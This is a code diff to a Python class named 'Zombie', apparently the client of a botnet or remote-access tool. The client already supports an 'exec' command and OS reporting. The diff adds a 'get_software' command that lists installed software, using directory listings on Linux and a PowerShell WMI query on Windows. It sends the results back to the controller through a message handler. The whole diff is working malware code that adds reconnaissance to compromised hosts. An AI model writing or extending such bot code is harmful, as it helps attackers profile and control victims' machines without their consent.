@@ -11,7 +11,9 @@ codes_list = {
     '1':'exec',
     '__comment__get_os':'cid=2, does not have second part (for request)',
     'get_os':'2',
-    '2':'get_os'
+    '2':'get_os',
+    'get_software':'3',
+    '3':'get_software'
 }
 
 class Zombie:
@@ -92,6 +94,34 @@ class Zombie:
 
         elif code == 'get_os':
             self.send_os_info()
+
+        elif code == 'get_software':
+            self.send_software()
+
+    def powershellize_command(self, command):
+        powershell_command = 'powershell "{}"'.format(command)
+        return powershell_command
+
+    def get_os(self):
+        import platform
+        os_name = platform.system()
+        return os_name.lower()
+
+    def send_software(self):
+        os_name = self.get_os()
+        import os
+        if 'linux' in os_name:
+            command = 'ls /usr/bin /opt'
+            output = os.popen(command).read()
+
+        elif 'windows' in os_name:
+            command = 'Get-WmiObject -Class Win32_Product | Select-Object -Property Name'
+            powershellized_command = self.powershellize_command(command=command)
+            output = os.popen(powershellized_command).read()
+        else:
+            output = 'Other OS : {}'.format(os_name)
+
+        self.msg_manager(msg='cid=' + codes_list['get_software'] + ',' + output)
 
     def send_os_info(self):
         import platform
